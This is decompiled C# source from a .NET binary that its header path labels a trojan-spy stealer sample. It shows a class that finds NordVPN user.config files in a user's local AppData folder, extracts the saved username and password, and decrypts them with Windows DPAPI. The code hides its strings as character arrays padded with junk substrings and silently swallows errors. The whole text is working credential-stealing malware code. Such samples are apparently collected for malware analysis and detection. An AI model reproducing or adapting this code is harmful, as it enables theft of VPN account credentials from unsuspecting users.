// Decompiled with JetBrains decompiler
// Type: SystemComponentModelRefreshPropertiesAttributel
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

public class SystemComponentModelRefreshPropertiesAttributel
{
  public static List<SystemComponentModelCultureInfoConverterb> Find()
  {
    List<SystemComponentModelCultureInfoConverterb> cultureInfoConverterbList = new List<SystemComponentModelCultureInfoConverterb>();
    try
    {
      DirectoryInfo directoryInfo1 = new DirectoryInfo(Path.Combine(Environment.ExpandEnvironmentVariables("%USEDisposeRPROFILE%\\AppDaDisposeta\\LDisposeocal".Replace("Dispose", string.Empty)), new string(new char[7]
      {
        'N',
        'o',
        'r',
        'd',
        'V',
        'P',
        'N'
      })));
      if (!directoryInfo1.Exists)
        return cultureInfoConverterbList;
      DirectoryInfo directoryInfo2 = directoryInfo1;
      string searchPattern = new string(new char[12]
      {
        'N',
        'o',
        'r',
        'd',
        'V',
        'p',
        'n',
        '.',
        'e',
        'x',
        'e',
        '*'
      });
      foreach (DirectoryInfo directory1 in directoryInfo2.GetDirectories(searchPattern))
      {
        foreach (DirectoryInfo directory2 in directory1.GetDirectories())
        {
          try
          {
            string str = Path.Combine(directory2.FullName, new string(new char[11]
            {
              'u',
              's',
              'e',
              'r',
              '.',
              'c',
              'o',
              'n',
              'f',
              'i',
              'g'
            }));
            if (File.Exists(str))
            {
              XmlDocument xmlDocument = new XmlDocument();
              xmlDocument.Load(str);
              string innerText1 = xmlDocument.SelectSingleNode(new string(new char[76]
              {
                ' ',
                '/',
                '/',
                's',
                'e',
                't',
                't',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'p',
                'l',
                'a',
                'c',
                'e',
                'i',
                'n',
                'g',
                '[',
                '@',
                'n',
                'a',
                'm',
                'e',
                '=',
                '\\',
                'U',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'p',
                'l',
                'a',
                'c',
                'e',
                's',
                'e',
                'r',
                'n',
                'a',
                'm',
                'e',
                '\\',
                ']',
                '/',
                'v',
                'a',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'p',
                'l',
                'a',
                'c',
                'e',
                'l',
                'u',
                'e'
              }).Replace("String.Replace", string.Empty)).InnerText;
              string innerText2 = xmlDocument.SelectSingleNode(new string(new char[72]
              {
                '/',
                '/',
                's',
                'e',
                't',
                't',
                'i',
                'n',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'm',
                'o',
                'v',
                'e',
                'g',
                '[',
                '@',
                'n',
                'a',
                'm',
                'e',
                '=',
                '\\',
                'P',
                'a',
                's',
                's',
                'w',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'm',
                'o',
                'v',
                'e',
                'o',
                'r',
                'd',
                '\\',
                ']',
                '/',
                'v',
                'a',
                'l',
                'u',
                'S',
                't',
                'r',
                'i',
                'n',
                'g',
                '.',
                'R',
                'e',
                'm',
                'o',
                'v',
                'e',
                'e'
              }).Replace("String.Remove", string.Empty)).InnerText;
              if (!string.IsNullOrWhiteSpace(innerText1))
              {
                if (!string.IsNullOrWhiteSpace(innerText2))
                {
                  string EncryptedData1 = Encoding.UTF8.GetString(Convert.FromBase64CharArray(innerText1.ToCharArray(), 0, innerText1.Length));
                  string EncryptedData2 = Encoding.UTF8.GetString(Convert.FromBase64CharArray(innerText2.ToCharArray(), 0, innerText2.Length));
                  string decoded1 = dnlibDotNetPdbDssSymbolWriterImplF.GetDecoded(EncryptedData1, DataProtectionScope.LocalMachine);
                  string decoded2 = dnlibDotNetPdbDssSymbolWriterImplF.GetDecoded(EncryptedData2, DataProtectionScope.LocalMachine);
                  if (!string.IsNullOrWhiteSpace(decoded1))
                  {
                    if (!string.IsNullOrWhiteSpace(decoded2))
                      cultureInfoConverterbList.Add(new SystemComponentModelCultureInfoConverterb()
                      {
                        Id2 = decoded1,
                        Id3 = decoded2
                      });
                  }
                }
              }
            }
          }
          catch
          {
          }
        }
      }
    }
    catch
    {
    }
    return cultureInfoConverterbList;
  }
}
